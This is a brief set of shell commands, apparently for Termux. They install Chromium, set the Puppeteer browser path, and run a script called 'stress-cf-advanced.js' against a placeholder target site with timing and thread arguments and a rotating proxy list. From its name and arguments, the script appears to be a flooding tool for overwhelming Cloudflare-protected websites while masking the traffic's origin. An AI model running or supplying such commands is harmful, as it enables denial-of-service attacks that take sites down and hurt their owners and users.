pkg install chromium
export PUPPETEER_EXECUTABLE_PATH=/data/data/com.termux/files/usr/bin/chromium

node stress-cf-advanced.js https://target.com 60 10 4 proxies.txt

node stress-cf-advanced.js https://target.com 60 10 4 https://api.example.com/proxies
